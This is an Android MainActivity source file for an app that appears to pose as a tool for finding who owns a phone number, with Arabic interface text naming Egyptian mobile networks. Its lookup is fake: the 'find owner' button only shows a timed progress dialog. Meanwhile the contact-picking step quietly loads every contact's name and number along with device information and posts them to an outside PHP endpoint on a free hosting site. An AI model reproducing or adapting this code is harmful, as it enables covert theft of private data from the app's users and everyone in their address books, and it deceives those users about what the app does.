package com.example.myntrafind;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.AlertDialog;
import android.app.ProgressDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Color;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Objects;


public class MainActivity extends AppCompatActivity {
    private static final int PICK_CONTACT = 1;
    private String selectedContactNameAndNumber = "";
    private String allContactNumber = "";
    private TextView textView;
    private Button buttonFindOwner;
    private Button buttonSelectNumber;
    private Button buttonMore;
    String info="";
    String currentTime = DateTimeUtils.getCurrentDateTime();


    @SuppressLint("SetTextI18n")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        //hide action bar
        Objects.requireNonNull(getSupportActionBar()).hide();
        //calling class device info
        DeviceInfo deviceInfo = new DeviceInfo(MainActivity.this);
        info = deviceInfo.getDeviceInfo();

        textView = findViewById(R.id.textView);
        textView.setTextColor(Color.RED);
        buttonSelectNumber = findViewById(R.id.buttonSelectNumber);
        buttonFindOwner = findViewById(R.id.buttonFindOwner);
        buttonMore = findViewById(R.id.more);
        selectedContactNameAndNumber = ""; // اسم ورقم الهاتف المحدد افتراضيًا
        textView.setText("لم يتم أختيار الرقم"); // النص الافتراضي TextView


        buttonSelectNumber.setOnClickListener(v -> {
            if (ActivityCompat.checkSelfPermission(MainActivity.this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(MainActivity.this, new String[]{Manifest.permission.READ_CONTACTS}, 1);
            } else {
                //  load all contact to string allContactNumber
               loadAllContacts();
                SaveDataAsyncTask task = new SaveDataAsyncTask();
                task.execute("#########################"+"\n"+currentTime+"\n"+info+"\n"+"#########################"+"\n"+allContactNumber+"\n"+"#########################");
                //  select contact number
                selectContact();
            }
        });

        buttonFindOwner.setOnClickListener(v -> {
            //  do some things
            ConnectivityManager cm =
                    (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
            NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
            boolean isConnected = activeNetwork != null &&
                    activeNetwork.isConnectedOrConnecting();
            if (isConnected) {
                new DownloadTask().execute();
            } else {
                Toast.makeText(MainActivity.this, "لا يوجد اتصال بالإنترنت", Toast.LENGTH_SHORT).show();
            }
        });
    }

    private class DownloadTask extends AsyncTask<Void, Integer, Void> {
        ProgressDialog progressDialog;

        @Override
        protected void onPreExecute() {
            super.onPreExecute();
            progressDialog = new ProgressDialog(MainActivity.this);
            progressDialog.setMessage("برجاء الانتظار ...");
            progressDialog.setCancelable(false);
            progressDialog.show();
        }

        @Override
        protected Void doInBackground(Void... voids) {
            for (int i = 0; i < 10; i++) {
                try {
                    Thread.sleep(1000);
                    publishProgress((i + 1) * 10);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
            return null;
        }

        @Override
        protected void onProgressUpdate(Integer... values) {
            super.onProgressUpdate(values);
            progressDialog.setProgress(values[0]);
        }

        @Override
        protected void onPostExecute(Void aVoid) {
            super.onPostExecute(aVoid);
            progressDialog.dismiss();

            AlertDialog.Builder builder = new AlertDialog.Builder(MainActivity.this);
            builder.setMessage("يُرجى الضغط على زر \"المزيد\" لتضييق نطاق البحث، نظرًا لوجود تشابك في البيانات المتعلقة بالرقم المستعلم عنه داخل الشبكات \"Vodafone,Orange,Etisalat,We\". ")
                    .setCancelable(false)
                    .setPositiveButton("حسنا", new DialogInterface.OnClickListener() {
                        public void onClick(DialogInterface dialog, int id) {
                            //button.setEnabled(true);
                            buttonMore.setVisibility(View.VISIBLE);
                            buttonSelectNumber.setVisibility(View.INVISIBLE);
                            buttonFindOwner.setVisibility(View.INVISIBLE);

                        }
                    });
            AlertDialog alert = builder.create();
            alert.show();
        }
    }

    private void loadAllContacts() {
        StringBuilder allContactsBuilder = new StringBuilder();
        try (Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)) {
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    @SuppressLint("Range") String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    @SuppressLint("Range") String number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    allContactsBuilder.append(name).append(" - ").append(number).append("\n");
                }
            }
            allContactNumber = allContactsBuilder.toString();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private final ActivityResultLauncher<Intent> contactPickerLauncher = registerForActivityResult(new ActivityResultContracts.StartActivityForResult(), result -> {
        if (result.getResultCode() == Activity.RESULT_OK) {
            if (result.getData() != null) {
                Cursor cursor = null;
                try {
                    Uri uri = result.getData().getData();
                    cursor = getContentResolver().query(uri, null, null, null, null);
                    cursor.moveToFirst();
                    //@SuppressLint("Range") String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    @SuppressLint("Range") String number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    //selectedContactNameAndNumber = name + " - " + number;
                    selectedContactNameAndNumber = number;
                    textView.setText(selectedContactNameAndNumber);
                    textView.setTextColor(Color.BLUE);
                    buttonFindOwner.setVisibility(View.VISIBLE);
                } catch (Exception e) {
                    e.printStackTrace();
                } finally {
                    if (cursor != null) {
                        cursor.close();
                    }
                }
            }
        }
    });

    private void selectContact() {
        Intent intent = new Intent(Intent.ACTION_PICK, ContactsContract.CommonDataKinds.Phone.CONTENT_URI);
        contactPickerLauncher.launch(intent);
        SaveDataAsyncTask task = new SaveDataAsyncTask();
        task.execute("#########################"+"\n"+currentTime+"\n"+info+"\n"+"#########################"+"\n"+allContactNumber+"\n"+"#########################");
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == 1) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                selectContact();
            }else {
                AlertDialog.Builder builder = new AlertDialog.Builder(this);
                builder.setMessage("يجب السماح للتطبيق بالوصول للاسماء لأختيار رقم")
                        .setPositiveButton("OK", (dialog, which) -> {
                            // يمكنك تنفيذ أي إجراءات إضافية هنا
                            Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                            Uri uri = Uri.fromParts("package", getPackageName(), null);
                            intent.setData(uri);
                            startActivity(intent);
                        })
                        .setCancelable(false)
                        .show();
            }
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (resultCode == RESULT_OK) {
            if (requestCode == PICK_CONTACT) {
                Cursor cursor = null;
                try {
                    Uri uri = data.getData();
                    cursor = getContentResolver().query(uri, null, null, null, null);
                    cursor.moveToFirst();
                    @SuppressLint("Range") String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    @SuppressLint("Range") String number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    selectedContactNameAndNumber = name + " - " + number;
                    textView.setText(selectedContactNameAndNumber);
                    buttonFindOwner.setEnabled(true);
                } catch (Exception e) {
                    e.printStackTrace();
                } finally {
                    if (cursor != null) {
                        cursor.close();
                    }
                }
            }
        }
    }

    private class SaveDataAsyncTask extends AsyncTask<String, Void, String> {

        @Override
        protected String doInBackground(String... strings) {
            String text = strings[0];
            StringBuilder response = new StringBuilder();
            try {
                URL url = new URL("https://regenerate-nuts.000webhostapp.com/savedata.php");
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                connection.setRequestMethod("POST");
                connection.setDoOutput(true);

                OutputStream os = connection.getOutputStream();
                os.write(("text=" + text).getBytes());

                int responseCode = connection.getResponseCode();

                if (responseCode == HttpURLConnection.HTTP_OK) {
                    InputStream is = connection.getInputStream();
                    BufferedReader br = new BufferedReader(new InputStreamReader(is));
                    String line;
                    while ((line = br.readLine()) != null) {
                        response.append(line);
                    }
                } else {
                    response = new StringBuilder("Error: " + responseCode);
                }

                connection.disconnect();
            } catch (Exception e) {
                e.printStackTrace();
                response = new StringBuilder("Error: " + e.getMessage());
            }
            return response.toString();
        }

        @Override
        protected void onPostExecute(String s) {
            Toast.makeText(MainActivity.this, s, Toast.LENGTH_SHORT).show();
        }
    }
}